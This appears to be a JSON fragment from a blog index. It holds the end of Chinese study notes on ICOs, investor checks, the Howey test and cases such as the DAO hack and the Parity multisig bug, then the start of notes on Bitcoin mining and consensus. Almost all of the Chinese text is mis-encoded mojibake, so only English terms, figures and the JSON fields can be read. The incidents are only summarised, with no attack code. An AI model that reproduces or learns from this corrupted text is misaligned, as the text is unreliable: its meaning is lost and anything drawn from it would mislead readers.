è¿™ä¸ªåè®®å¯ä»¥è®©ä»£å¸çš„äº’åŠ¨æ›´åŠ æ–¹ä¾¿ï¼Œé€šè¿‡ä¸ä»¥å¤ªåŠç½‘ç»œçš„äº¤äº’   ERC721: The Ethereum standard for Non-Fungible Tokens (NFTs)\nERC721ä¸­tokenè¢«ç”¨æ¥è¡¨ç¤ºä¸€æ ·uniqueç‰¹æœ‰çš„ç‰©å“ï¼Œä½¿å…¶æ— æ³•è¢«ä»£æ›¿ æœ€æ—©çš„NTFå°±æ˜¯CryptoKitties       ç›‘ç®¡æœºæ„\né˜²æ­¢è¯ˆéª— è¦æ±‚æ‰€æœ‰çš„å‹Ÿé›†èµ„é‡‘çš„äººäº†è§£è¿™äº›æŠ•èµ„è€…ï¼š  å‘èµ·äººçš„è¿‡å»è®°å½•  å…¬å¸çš„çœŸæ­£è®¡åˆ’å’Œæ„å›¾  æ³•å¾‹å’Œç›‘ç®¡çŠ¶å†µ  å†…å¹•äº¤æ˜“å’Œå…³ç³»  é£é™©   æ¥é˜²æ­¢æ¥è‡ªäºå„ç§æ–¹é¢çš„é£é™©ï¼š   å¸‚åœºéœ€æ±‚   ç«äº‰è€…   ç›‘ç®¡é£é™©   æŠ€æœ¯å‘å±•ã€‚       Accredited investors å—åˆ°è®¤å¯çš„æŠ•èµ„è€…\nå¤§å¤šæ•°é‡‘èä¸šç›‘ç®¡æœºæ„æ›´å…³æ³¨æ™®é€šæ¶ˆè´¹è€…å’ŒæŠ•èµ„è€…çš„é£é™© è¾ƒå°‘å…³æ³¨å¯¹ä»¥ä¸‹äººç¾¤çš„é£é™©   é«˜å‡€å€¼ä¸ªäººï¼ˆè´¢å¯Œè¶…è¿‡10ä¸‡ç¾å…ƒçš„äººï¼‰ã€‚   ç§äººæŠ•èµ„æ±    ä¸€äº›æœºæ„ä¸“æœ‰çš„è®¤å¯æŠ•èµ„è€…çš„èŒƒå›´ï¼š  å¯¹è¿™äº›æŠ•èµ„è€…å’Œä»–ä»¬åŠ å…¥çš„æŠ•èµ„æ± çš„ç›‘ç®¡å’Œç›‘ç£è¾ƒå°‘  å¯¹å†²åŸºé‡‘\u0026ndash;ä½¿ç”¨é«˜é£é™©ç­–ç•¥çš„è®¤å¯æŠ•èµ„è€…çš„èµ„é‡‘æ± ã€‚       Cryptocurrency Hedge Funds åŠ å¯†è´§å¸å¯¹å†²åŸºé‡‘\né›†åˆæŠ•èµ„åŸºé‡‘ï¼Œç›®æ ‡æ˜¯æŠ•èµ„äºã€‚  åŠ å¯†è´§å¸å’Œæ›¿ä»£å¸  ICOs  åœ¨åŒºå—é“¾ä¸Šè¿è¡Œçš„åˆåˆ›ä¼ä¸š   é€šå¸¸ç”±ä¼ ç»Ÿå¯¹å†²åŸºé‡‘çš„åˆä½œä¼™ä¼´å’ŒæŠ•èµ„è€…åˆ›å»º  åŠ å¯†è´§å¸å¯¹ä¼ ç»ŸæŠ•èµ„è€…æ¥è¯´å¤ªä¸ç¨³å®šäº†       Checks on investors å¯¹æŠ•èµ„è€…çš„å®¡æŸ¥\nå¯¹æŠ•èµ„è€…çš„å®¡æŸ¥ä¸»è¦æ˜¯ä¸ºäº†é€šè¿‡äº†è§£æŠ•èµ„äººçš„ä¿¡æ¯ä»¥é˜²æ­¢æ´—é’±ä»¥åŠå…¶ä»–æŠ•èµ„èƒŒåçš„è¿æ³•è¡Œä¸º KYC â€“ Know Your Customer regulations : â€“ Identity  â€“ Location \u0026lt;br/\u0026gt; â€“ Wealth \u0026amp;amp; assets \u0026lt;br/\u0026gt; â€“ Other investments \u0026lt;br/\u0026gt;  AML â€“ Anti-Money Laundering regulations :\nâ€“ What are the source(s) of funds? é’±ä»å“ªå„¿æ¥çš„ Money-laundering :\nç›®æ ‡ï¼š â€“ Proceeds of criminal activity (often in cash) çŠ¯ç½ªæ´»åŠ¨çš„æ”¶ç›Š â€“ Proceeds of transactions with entities under sanctions ä¸å—åˆ¶è£çš„ç›®æ ‡è¿›è¡Œäº¤æ˜“æ‰€å¾—åˆ©ç›Š     Registration of security è¯åˆ¸æ³¨å†Œ\néœ€è¦å‘ç¾å›½è¯åˆ¸äº¤æ˜“å§”å‘˜ä¼šæ³¨å†Œè¯åˆ¸ï¼ˆé™¤éè·å¾—è±å…ï¼‰ï¼Œå¹¶æä¾›ä»¥ä¸‹ç»†èŠ‚ã€‚ å…¬å¸çš„å±æ€§å’Œå•†ä¸šç›®çš„ æ‰€æä¾›çš„è¯åˆ¸ å…¬å¸çš„ç®¡ç†å±‚ ç”±ç‹¬ç«‹ä¼šè®¡å¸ˆè®¤è¯çš„è´¢åŠ¡æŠ¥è¡¨ã€‚     Howey Test\nHoweyæµ‹è¯•æ˜¯ç”¨æ¥é‰´å®šä¸€ä»½è¯åˆ¸æŠ•èµ„åˆåŒæ˜¯å¦ä¸ºåˆæ³•çš„ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹å››ä¸ªæ¡ä»¶   å®ƒæ˜¯é‡‘é’±çš„æŠ•èµ„  \u0026ldquo;é‡‘é’± \u0026ldquo;å¯èƒ½åŒ…æ‹¬å…¶ä»–å½¢å¼çš„è¿‘ä¼¼é‡‘é’±  é‡‘é’±çš„æŠ•èµ„     å­˜åœ¨å¯¹æŠ•èµ„åˆ©æ¶¦çš„é¢„æœŸ  æƒ³è¦èµšé’±çš„     èµ„é‡‘çš„æŠ•èµ„æ˜¯åœ¨ä¸€ä¸ªå…±åŒçš„ä¼ä¸šä¸­ \u0026ndash;å°†èµ„é‡‘æ±‡é›†åˆ°ä¸€ä¸ªè‚¡ä»½å…¬å¸æˆ–ç±»ä¼¼çš„è”åˆä¼ä¸šä¸­å»   ä»»ä½•åˆ©æ¶¦éƒ½æ¥è‡ªäºå‘èµ·äººæˆ–ç¬¬ä¸‰æ–¹çš„åŠªåŠ›  å¦‚æœåˆ©æ¶¦æ¥è‡ªäºæŠ•èµ„è€…è‡ªå·±çš„è¡Œä¸ºï¼Œé‚£ä¹ˆå¯èƒ½å°±ä¸æ˜¯è¯åˆ¸ã€‚         å¯¹äºæœ‰æ„å‘çš„ICOï¼Œå¤§è‡´æœ‰3ç§é€‰æ‹©\né€‰æ‹©1ï¼ˆé‡åº¦ç›‘ç®¡ï¼‰   å°†ä»£å¸ä½œä¸ºè¯åˆ¸åœ¨ç¾å›½SECæ³¨å†Œ   çº¦50ä¸‡ç¾å…ƒçš„æ³•å¾‹è´¹ç”¨   4-6ä¸ªæœˆçš„è¿‡ç¨‹   æ–¹æ¡ˆ2ï¼ˆè½»åº¦ç›‘ç®¡ï¼‰   ä¸å‘ç¾å›½å…¬æ°‘æˆ–å±…æ°‘å‡ºå”®ï¼Œä»¥è·å¾—ç¾å›½è¯åˆ¸äº¤æ˜“å§”å‘˜ä¼šçš„è±å…ã€‚   åŒæ ·åœ°ï¼Œä¸å‘ä¸­å›½æˆ–éŸ©å›½å±…æ°‘å‡ºå”®ï¼ˆè·å¾—å½“åœ°å§”å‘˜ä¼šçš„å’Œé¢ï¼‰ã€‚   çº¦5-10ä¸‡ç¾å…ƒçš„æ³•å¾‹è´¹ç”¨ï¼Œ2-3ä¸ªæœˆ   éœ€è¦æ”¶é›†KYCå’Œåæ´—é’±ä¿¡æ¯   ä¸Cypher-punkçš„ç²¾ç¥èƒŒé“è€Œé©°   é€‰é¡¹3ï¼ˆæ— æ³•è§„ï¼‰   æ— è§†è¿™äº›æ³•è§„   æœ‰è¢«ç›‘ç®¡æœºæ„èµ·è¯‰å’Œ/æˆ–è¢«æŠ•èµ„äººèµ·è¯‰çš„é£é™©   éœ€è¦æ‰¾ä¸ªå¥½å¾‹å¸ˆ       ICOçš„å‘èµ·çš„é˜¶æ®µ\n  ç§äººä»£å¸åˆ†é…   ç»™æœ‹å‹å’Œå‘˜å·¥   ç§äººä»£å¸åˆ†é…   é€šå¸¸æ˜¯ç»™å¤§å‹æŠ•èµ„è€…å’ŒåŠ å¯†å¯¹å†²åŸºé‡‘   å…¬å¼€ä»£å¸åˆ†é…   ç»™ä»»ä½•äººï¼ˆä¹Ÿè®¸å—é™åˆ¶ï¼‰ã€‚   ä¾‹å¦‚ï¼Œä¸æä¾›ç»™ç¾å›½ã€ä¸­å›½æˆ–éŸ©å›½çš„å…¬æ°‘æˆ–å±…æ°‘   åœ¨ç™½çš®ä¹¦å’Œæ‹›è‚¡è¯´æ˜ä¹¦çš„åŸºç¡€ä¸Šç­¹é›†èµ„é‡‘   å¹³å°çš„å¼€å‘   å¹¶åˆ›å»ºä»£å¸   å¯åŠ¨ä¸šåŠ¡   å’Œä»£å¸çš„ä½¿ç”¨ã€‚       ICOs - ä¸€ä¸ªå…¸å‹çš„ç»„ç»‡ç»“æ„\n  ä¸€ä¸ªæ…ˆå–„åŸºé‡‘ä¼šï¼ˆFï¼‰å‘èµ·ICOå¹¶æ¥æ”¶èµ„é‡‘  æ‹¥æœ‰ç‹¬ç«‹çš„è‘£äº‹ä¼š     ä¸€å®¶è½¯ä»¶å¼€å‘å…¬å¸ï¼ˆDï¼‰å¼€å‘ç†å¿µå’Œç™½çš®ä¹¦  å½“ç­¹é›†åˆ°èµ„é‡‘æ—¶ï¼Œéƒ¨åˆ†èµ„é‡‘ç”±Fåˆ†é…ç»™Dä»¥å»ºç«‹å¹³å°ã€‚     åœ°ç‚¹  åŸºé‡‘ä¼šé€šå¸¸åœ¨æœ‰åˆ©äºç›‘ç®¡çš„å¸æ³•ç®¡è¾–åŒºæ³¨å†Œ  ä¾‹å¦‚ï¼Œç‘å£«ã€ç›´å¸ƒç½—é™€ã€æ–°åŠ å¡ã€‚  è½¯ä»¶å…¬å¸åœ¨å…¶ä»–åœ°æ–¹æ³¨å†Œ  ä¾‹å¦‚ï¼Œè‹±å›½ï¼Œç¾å›½ã€‚  é›‡å‘˜å¯èƒ½åœ¨ä»»ä½•åœ°æ–¹ã€‚     æ½œåœ¨çš„æ²»ç†é—®é¢˜   åŸºé‡‘ä¼šï¼ˆFï¼‰å’Œè½¯ä»¶å…¬å¸ï¼ˆDï¼‰ä¹‹é—´çš„å…³ç³»æ˜¯ä»€ä¹ˆï¼Ÿ   å¦‚æœå‘ç”Ÿçº çº·ï¼Œç®¡è¾–æƒåœ¨å“ªé‡Œï¼Ÿ   ä»£å¸æŒæœ‰è€…å¯¹è½¯ä»¶æœ‰æƒåˆ©å—ï¼Ÿ         ä»£å¸åˆ†é…æœºåˆ¶\n  åœ¨å…¬å¼€é”€å”®ä¸­ä½¿ç”¨å„ç§åˆ†é…æœºåˆ¶æ¥åˆ†é…ä»£å¸  é€šå¸¸æ˜¯æ‹å–ï¼Œå°†ä»£å¸æˆäºˆå‡ºä»·æœ€é«˜çš„äºº     åŸºæœ¬å…³æ³¨ä»£å¸ï¼ˆBATCoinï¼‰ICO   2017å¹´5æœˆï¼šåœ¨30ç§’å†…ç­¹é›†äº†3500ä¸‡ç¾å…ƒçš„èµ„é‡‘   åªæœ‰130åæŠ•èµ„è€…   å‰20ä¸ªåœ°å€æ§åˆ¶äº†50%ä»¥ä¸Šçš„ä»£å¸     Bancor ICO   2017å¹´6æœˆ12æ—¥   3å°æ—¶å†…ç­¹é›†äº†1.53äº¿ç¾å…ƒï¼ˆä»¥å¤ªå¸ï¼‰çš„èµ„é‡‘   æ¯”è®¡åˆ’å¤šå‡º5100ä¸‡ç¾å…ƒ     æ‰¹è¯„   å¯¹å†…éƒ¨äººå£«çš„åçˆ±   é€Ÿåº¦   æ²¡æœ‰ç»™ä»£å¸æ€»é‡è®¾ç½®ä¸Šé™ã€‚       Case Studies   Ethereum\nä»¥å¤ªåŠ   2013: Vitalik Buterinçš„ç™½çš®ä¹¦   å»ºè®®åœ¨åŒºå—é“¾ä¸Šå®ç°å®Œå…¨çš„ç¼–ç¨‹èƒ½åŠ›ï¼ˆSolidityï¼‰   2014å¹´7-8æœˆè¿›è¡ŒICO   åœ¨å½“æ—¶çš„ICOä¸­æ’åç¬¬å…­   ç­¹é›†äº†1840ä¸‡ç¾å…ƒ   ä»¥å›ºå®šä»·æ ¼é€’å‡çš„BTCè¿›è¡Œæ”¯ä»˜   2000 ETH / BTCé™è‡³1337 ETH / BTC   31.5K BTCæˆ–6000ä¸‡ETH       DAO\nDecentralized Autonomous Organization DAO   å»ä¸­å¿ƒåŒ–çš„è‡ªæ²»ç»„ç»‡   åœ¨ä»¥å¤ªåŠä¸Šè¿è¡Œçš„è‡ªè¥é£é™©æŠ•èµ„åŸºé‡‘   åœ¨1ä¸ªæœˆå†…ï¼ˆ2016å¹´5æœˆï¼‰ä»11000åæŠ•èµ„è€…é‚£é‡Œç­¹é›†äº†1.5äº¿ç¾å…ƒçš„èµ„é‡‘   æ‰“ç®—è®©ä»£å¸æŒæœ‰äººå¯¹æŠ•èµ„å»ºè®®è¿›è¡ŒæŠ•ç¥¨   2016å¹´6æœˆã€‚ä»£ç æ¼æ´è¢«åˆ©ç”¨  5000ä¸‡ç¾å…ƒè¢«æŠ½èµ°   æŠ•èµ„è€…çš„é£é™©  ç”±äºè®¾è®¡ï¼ˆæˆ–æµ‹è¯•ï¼‰ä¸å½“çš„ä»£ç é€ æˆçš„èµ„é‡‘æŸå¤±   ä»¥å¤ªåŠèŠ‚ç‚¹æŠ•ç¥¨å†³å®šç¡¬åˆ†å‰ä»¥æ¢å¤æŸå¤±çš„èµ„é‡‘   2016å¹´7æœˆ20æ—¥åœ¨åŒºå—1,920,000å¤„   ç°åœ¨æœ‰2ä¸ªåˆ†æ”¯ã€‚   ä»¥å¤ªåŠï¼ˆåŒºå—é“¾æ’é™¤äº†æŸå¤±ï¼‰   ä»¥å¤ªåŠclassicï¼ˆæ¼æ´ä»ç„¶å­˜åœ¨ï¼‰ã€‚         Tezos\nä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„åŒºå—é“¾ï¼Œä»¥ä¿ƒè¿›ä»£ç çš„æ­£å¼éªŒè¯ï¼Œä»¥åŠæ™ºèƒ½åˆçº¦ã€‚   å‘èµ·äººå’Œs/wå¼€å‘è€…ã€‚é˜¿ç‘Ÿ-å¸ƒè±ç‰¹æ›¼å’Œå‡¯ç‘Ÿç³-å¸ƒè±ç‰¹æ›¼ï¼ˆç¾å›½ï¼‰   TezosåŸºé‡‘ä¼šï¼ˆç‘å£«ï¼‰ã€‚Johann Gevers   2017å¹´7æœˆçš„ICO  ç­¹é›†äº†2.32äº¿ç¾å…ƒçš„ETHå’ŒBTC     å¸ƒé›·ç‰¹æ›¼å¤«å¦‡ä¸åŸºé‡‘ä¼šä¹‹é—´å­˜åœ¨åˆ†æ­§  ä¸¤äººä¹‹é—´çš„å¾‹å¸ˆå‡½     æ¨è¿Ÿå¼€å‘å’Œæ¨å‡ºä»£å¸çš„æ—¶é—´   è°æ¥åšç³»ç»Ÿ/è½¯ä»¶å¼€å‘ï¼Ÿ     æŠ•èµ„è€…å¯¹å»¶è¿Ÿçš„ä¸æ»¡  æŠ•èµ„è€…æå‡ºé›†ä½“è¯‰è®¼çš„é£é™©ã€‚       Polkadot 2017\nç›®æ ‡  å°†ç§äººåŒºå—é“¾å’Œå…¬å…±åŒºå—é“¾è”ç³»åœ¨ä¸€èµ·     æ¨åŠ¨è€…   Gavin Woodï¼ˆå‰ä»¥å¤ªåŠCTOï¼‰   Jutta Steinerï¼ˆå‰ä»¥å¤ªåŠï¼‰ã€‚   Parityè½¯ä»¶å…¬å¸     Parityè½¯ä»¶å…¬å¸ï¼ˆè‹±å›½ï¼‰   Web 3.0åŸºé‡‘ä¼šï¼ˆæŸæ—ï¼‰   2017å¹´10æœˆè¿›è¡ŒICOï¼Œå‹Ÿé›†èµ„é‡‘ã€‚   ç§äººé”€å”®ï¼š8300ä¸‡ç¾å…ƒçš„ç‘å£«æ³•éƒ   å…¬å¼€é”€å”®ï¼š1.4äº¿ç¾å…ƒçš„ä»¥å¤ªå¸å’Œæ¯”ç‰¹å¸   æ‹å–è¿‡ç¨‹æ˜¯é™ä»·æ‹å–ï¼ˆè·å…°æ‹å–ï¼‰ã€‚     Polkadot: å¤šç­¾åé’±åŒ…çš„é—®é¢˜\næ”¯ä»˜åˆ°ä»¥å¤ªåŠå¤šç­¾åé’±åŒ…çš„èµ„é‡‘ ä»¥å¤ªåŠå¤šç­¾åé’±åŒ…æ¨¡æ¿å°†å¤§éƒ¨åˆ†çš„å¤„ç†ï¼ˆé™¤äº†æ”¯ä»˜å‡ºå»ï¼‰æ”¾åœ¨ä¸€ä¸ªåº“é’±åŒ…é‡Œ  è¿™æ˜¯ä¸ºäº†å‡å°‘å¤„ç†æˆæœ¬   åº“é’±åŒ…æœ‰ä¸€ä¸ªæ¼æ´   æœ‰äººå¯ä»¥è°ƒç”¨å®ƒå¹¶åˆå§‹åŒ–å®ƒï¼ˆè·å¾—å®ƒçš„æ‰€æœ‰æƒï¼‰ã€‚   ç„¶åå¯ä»¥æ€æ­»å®ƒ   æœ‰äººè¿™ä¹ˆåšäº†! (å¯èƒ½æ˜¯æ„å¤–çš„)   ä»»ä½•ä½¿ç”¨è¿™ä¸ªé’±åŒ…çš„å¤šé‡ç­¾åçš„é’±åŒ…éƒ½ä¸èƒ½å†è®¿é—®äº† ä¸€äº›50ä¸‡ETHä¸èƒ½å†è®¿é—®äº†  åŒ…æ‹¬ä¸ºPolkadotç­¹é›†çš„9000ä¸‡ç¾å…ƒçš„èµ„é‡‘ã€‚     Risks of an ICO   ä»»ä½•å•†ä¸šæŠ•èµ„çš„é£é™©æŠ•èµ„å¯èƒ½å¤±è´¥   å¸‚åœºéœ€æ±‚å¯èƒ½ä¸å­˜åœ¨   ç‰¹åˆ«æ˜¯å¯¹äºå¯»æ±‚åˆ›é€ æ–°å¸‚åœºç±»åˆ«çš„äº§å“   è¯ˆéª—å’Œæ¬ºè¯ˆ     å¯¹æ–°æŠ€æœ¯æŠ•èµ„çš„é£é™©   æŠ€æœ¯å¯èƒ½ä¼šå‘å‰å‘å±•   æŠ€æœ¯äººæ‰çš„çŸ­ç¼º   å¯èƒ½å‡ºç°ç«äº‰   ç½‘ç»œæ•ˆåº”å’Œè·¯å¾„ä¾èµ–     ICOçš„ç‰¹æ®Šé£é™©   æŠ€æœ¯æ˜¯æ–°çš„å’Œä¸æˆç†Ÿçš„ï¼Œè¿˜æ²¡æœ‰å¾—åˆ°å¾ˆå¥½çš„ç†è§£   ç›‘ç®¡é£é™©ï¼ˆä¾‹å¦‚ï¼Œè¢«ç›‘ç®¡æœºæ„èµ·è¯‰ï¼‰   å¯èƒ½æ˜¯ä¸€ä¸ªåºæ°éª—å±€   æŠ•èµ„è€…çš„é›†ä½“è¯‰è®¼   æ—©æœŸæŠ•èµ„è€…å¯èƒ½ä¼šè¢«åæœŸæŠ•èµ„è€…èµ·è¯‰ã€‚     ","date":"2022-05-13T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/dlc_exam_preparation_notes/","title":"DLC EXAM Preparation Notes"},{"content":"Mastering Bitcoin 2nd Edition Chapter 10: Mining and Consensus Introduction åœ¨æœ¬ç« å¼€å§‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±è¦ä¸ºå¤§å®¶è§£å†³ä¸€ä¸ªè¯¯åŒºï¼ŒMiningï¼ŒæŒ–çŸ¿ï¼Œå…¶å®å®ƒçš„ä¸»è¦ç›®çš„å¹¶ä¸æ˜¯è·å–æ–°çš„æ¯”ç‰¹å¸ï¼Œæˆ–è€…èµšå–transaction feeï¼Œè€Œæ˜¯ä¸ºäº†æ›´ä¸ºé‡è¦çš„ç›®çš„ï¼Œå³ä½œä¸ºBitcoinçš„å®‰å…¨æœºåˆ¶ï¼Œä»¥åŠä¿è¯å»ä¸­å¿ƒåŒ–çš„æ¦‚å¿µå¾—ä»¥å®ç°ã€‚è·å–æ–°çš„æ¯”ç‰¹å¸ä»¥åŠtransaction feeä½œä¸ºå¥–åŠ±ï¼Œå±äºç‹¬ç«‹çš„ä¸€ä¸ªincentive systemå¥–åŠ±ç³»ç»Ÿï¼Œç”¨äºæ¿€åŠ±çŸ¿å·¥ä»¬å®Œæˆminingçš„ä»»åŠ¡ï¼Œä¿è¯bitcoinçš„å®‰å…¨ã€‚ ä¸è¿‡æŒ–çŸ¿è¿™ä¸ªæ¯”å–»å®åœ¨æ˜¯æœ‰ç‚¹è´´åˆ‡ï¼ˆä¹Ÿè®¸å°±æ˜¯ä¸ºä»€ä¹ˆå³ä½¿å®¹æ˜“è¯¯å¯¼è¿˜æ˜¯è¿™ä¹ˆå«ï¼‰ï¼ŒæŒ–çŸ¿ä¸ä»…è·å¾—äº†çè´µçš„èµ„æºï¼ŒåŒæ—¶è¿™äº›èµ„æºæ˜¯æœ‰é™çš„ï¼Œè¶ŠæŒ–è¶Šå°‘çš„ï¼Œå› ä¸ºå¤§çº¦æ¯10minå°±ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„blockï¼Œé‚£ä¹ˆæ¯å››å¹´ï¼Œå‡†ç¡®æ¥è¯´æ˜¯æ¯210,000ä¸ªåŒºå—åæ–°çš„bitcoinå°±ä¼šå‡åŠï¼Œä»2009å¹´çš„50 bitcoin per blockæœ€ååˆ°2140å¹´ï¼Œ20.9999998 millionçš„æ¯”ç‰¹å¸éƒ½è¢«æŒ–å‡ºæ¥ä¹‹åå°±ä¸å†äº§ç”Ÿäº†ã€‚é‚£ä¹ˆè°è¿˜æŒ–çŸ¿å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯transaction feeçš„å¥–åŠ±ï¼Œå±Šæ—¶æ¯ä¸€ä¸ªblockçš„transactionåŠ¿å¿…è¶Šæ¥è¶Šå¤šï¼Œäº§ç”Ÿçš„è´¹ç”¨ä¹Ÿä¼šå æ®rewardçš„ä¸»å¯¼åœ°ä½ï¼ŒçŸ¿å·¥å°±ä¼šä¸ºäº†transaction feeè€Œç»§ç»­æŒ–çŸ¿ã€‚ä¸å¾—ä¸è¯´ï¼Œå³æ‡‚å¾—å¯†ç å­¦ï¼Œåˆå›ç¼–ç¨‹ï¼Œæœ‰æ‡‚ç»æµè´§å¸ï¼Œèƒ½è®¾è®¡å¦‚æ­¤å®Œå–„çš„æœºåˆ¶ï¼ŒSatoshi Nakamotoè¦ä¹ˆå°±æ˜¯ä¸€ä¸ªç»ä¸–å¤©æ‰ï¼Œè¦ä¸å°±æ˜¯ä¸€ç¾¤æ¥è‡ªå„ä¸ªé¢†åŸŸçš„å¤©æ‰ç»“åˆåœ¨ä¸€èµ·åˆ›é€ äº†è¿™ä¸ªæ°ä½œã€‚  Bitcoinå¦‚ä½•æŠµå¾¡Inflationé€šè´§è†¨èƒ€ï¼Ÿ é¦–å…ˆæˆ‘æ¥ç®€å•è¯´è¯´æˆ‘å¯¹äºé€šè´§è†¨èƒ€çš„ç†è§£ï¼Œä¹Ÿå°±æ˜¯è¯´æ”¿åºœé€šè¿‡è®©è´§å¸è´¬å€¼ï¼Œæ¥åˆºæ¿€æ¶ˆè´¹ï¼Œå› ä¸ºå¤§å®¶å­˜åœ¨é“¶è¡Œé‡Œçš„é’±æ…¢æ…¢å˜å¾—è¶Šæ¥è¶Šä¸å€¼é’±äº†ï¼Œé‚£ä¹ˆå¤§å®¶å°±ä¼šå€¾å‘äºè¶æ—©æŠŠé’±ä»·å€¼é«˜çš„æ—¶å€™æ¢æˆå•†å“æ¥ä¿å€¼ã€‚ é‚£ä¹ˆæ”¿åºœä¸€èˆ¬æ¥è¯´å°±æ˜¯é€šè¿‡ç›´æ¥æ‰“å°æ›´å¤šçš„é’±æ¥å®ç°è¿™ä¸€ç‚¹ï¼Œå› ä¸ºå½“é’±è¶Šæ¥è¶Šå¤šçš„æ—¶å€™ï¼Œå•†å“çš„ä»·æ ¼ä¹Ÿä¼šéšä¹‹ä¸Šæ¶¨æ¥åº”å¯¹ï¼Œå…¶å®è¿™ä¹Ÿæ˜¯ä¸€ç§éšæ€§çš„å¯¹äºå­˜å‚¨è€…çš„ç¨æ”¶æˆ–è€…è¯´æƒ©ç½šï¼Œå› ä¸ºä»–ä»¬åœ¨é“¶è¡Œä¸­çš„é’±çš„å®é™…ä»·å€¼å®é™…ä¸Šæ˜¯å‡å°‘äº†ã€‚ é‚£ä¹ˆæˆ‘ä»¬ä¸ºä»€ä¹ˆè¯´Bitcoinå…¶å®æ˜¯ä¸€ä¸ªDeflationary Moneyï¼Œå³é€šè´§ç´§ç¼©çš„è´§å¸å‘¢ï¼Œå› ä¸ºå…¶çš„æ€»æ•°é‡æ˜¯å›ºå®šçš„ï¼Œä¸ä¼šæ— é™çš„å°é’±ï¼Œå¹¶ä¸”å…¶äº§é‡åœ¨ä¸æ–­çš„å‡å°‘ï¼Œé‚£ä¹ˆbitcoinå®é™…ä¸Šå°±ä¼šå˜å¾—è¶Šæ¥è¶Šå€¼é’±ï¼Œé€ æˆäº†è¿™ä¸ªé€šè´§ç´§ç¼©ã€‚ Decentralized Consensus å»ä¸­å¿ƒåŒ–çš„å…±è¯† ä¼ ç»Ÿçš„æ”¯ä»˜ç³»ç»Ÿä¾èµ–äºä¸€ä¸ªæƒå¨ä¸­å¿ƒæœºæ„æ¥å®Œæˆæ‰€æœ‰äº¤æ˜“çš„è®¤è¯å’Œæ¸…ç®—ï¼Œä½†æ˜¯Satoshi Nakamoto æƒ³è¦åœ¨Bitcoinä¸Šæ„å»ºçš„å°±æ˜¯ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„ç³»ç»Ÿï¼Œå³ä¸éœ€è¦ä¸€ä¸ªæƒå¨æœºæ„ï¼Œè€Œæ˜¯æƒ³åŠæ³•è®©æ¯ä¸€ä¸ªæ‹¥æœ‰å®Œæ•´è´¦æœ¬æ‹·è´çš„ bitcoin full nodeséƒ½èƒ½è®¤åŒä¸€ä¸ªç»“æœï¼Œè¾¾æˆä¸€ä¸ªå…±è¯†ã€‚ å®ç°è¿™ä¸ªå»ä¸­å¿ƒåŒ–å…±è¯†éœ€è¦å››ä¸ªæ­¥éª¤ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªå±•å¼€æ¥å°†   Independent verification of each transaction, by every full node, based on a comprehensive list of criteria   Independent aggregation of those transactions into new blocks by mining nodes, coupled with demonstrated computation through a Proof-of-Work algorithm   Independent verification of the new blocks by every node and assembly into a chain   Independent selection, by every node, of the chain with the most cumulative computation demonstrated through Proof-of-Work   Independent Verification of Transactions åœ¨ç¬¬å…­ç« çš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“äº†å½“walletæƒ³è¦åˆ›é€ ä¸€ä¸ªæ–°çš„transactionï¼Œå®ƒå°±ä¼šæ”¶é›†ç”¨æˆ·å¯æ”¯é…çš„UTXOï¼Œç„¶åæä¾›è§£é”è¿™äº›UTXOçš„unlocking scriptsä»è€Œæ„å»ºoutputsçš„å†…å®¹å¹¶å°†æ„å»ºå¥½çš„è¿™ä¸ªtransactionå‘é€ç»™é‚»å±…èŠ‚ç‚¹ï¼Œä»è€Œæ‰©æ•£åˆ°æ•´ä¸€ä¸ªBitcoinç½‘ç»œå½“ä¸­ã€‚ ä½†æ˜¯åœ¨é‚»å±…èŠ‚ç‚¹è½¬å‘è¿™ä¸ªtransactionä¹‹å‰ï¼Œæ¯ä¸€ä¸ªè½¬å‘çš„èŠ‚ç‚¹éƒ½ä¼šè¿›è¡Œä¸€ä¸ªindependent verification of transactionsï¼Œç‹¬ç«‹çš„äº¤æ˜“éªŒè¯ï¼Œå®ƒä»¬ä¼šåˆ›å»ºä¸€ä¸ªvalid transactions poolæ¥æ”¶å½•æ‰€æœ‰çš„æœ‰æ•ˆçš„transactionã€‚è€ŒéªŒè¯çš„è¿‡ç¨‹åŒ…æ‹¬äº†æ•°æ®ç»“æ„ï¼Œä»¥åŠä¸€äº›åŸºæœ¬çš„æ•°å€¼çš„èŒƒå›´çš„ç¡®è®¤ï¼ŒåŒæ—¶è¿˜æœ‰ä¸€äº›æ›´ä¸ºå¤æ‚çš„éªŒè¯ä¾‹å¦‚ï¼š  æ£€æŸ¥transactionçš„inputsï¼Œæ‰€å¯¹åº”çš„outputsæ˜¯å¦çœŸçš„å­˜åœ¨  æ£€æŸ¥transactionçš„inputsï¼Œæ‰€å¯¹åº”çš„outputsï¼Œæ˜¯å¦å·²ç»è¢«æœ¬åœ°å·²ç»æ”¶å½•çš„valid transactionæ‰€ä½¿ç”¨äº†  æ£€æŸ¥transactionçš„inputsï¼Œæ‰€å¯¹åº”çš„outputsæ˜¯å¦å·²ç»è¢«èŠ±è´¹äº†  ä»¥åŠæˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡çš„ï¼ŒéªŒè¯unlocking scripts ä»¥åŠ locking scriptsçš„ç»„åˆæ˜¯å¦èƒ½å¤ŸåŒ¹é…   Mining Nodes Minersï¼ŒçŸ¿å·¥ï¼Œæ˜¯bitcoin networkä¸­ä¸€äº›ç‰¹æ®Šçš„èŠ‚ç‚¹ï¼Œæˆ‘ä»¬æ‹¿æœ¬ä¹¦çš„ä¸€ä¸ªç»å…¸ä¾‹å­æ¥ä»‹ç»ï¼ŒJingä½œä¸ºä¸€ä¸ªminerï¼Œè¿è¡Œç€ä¸€ä¸ªbitcoin full nodeï¼Œminerçš„èŒè´£æœ‰ï¼š  æ¥æ”¶å’Œä¼ é€’æœªç»ç¡®è®¤çš„transaction  é›†ä¸­è¿™äº›transactionæ”¾å…¥æ–°çš„blockå½“ä¸­  ç›‘å¬æ–°çš„blockçš„åˆ°æ¥ï¼Œè¿™ä¹Ÿæ„å‘³ç€æ–°blockçš„ç«äº‰å¤±è´¥ï¼Œä¹Ÿæ˜¯ä¸‹ä¸€ä¸ªblockç«äº‰çš„å¼€å§‹   Aggregating Transactions into Blocks 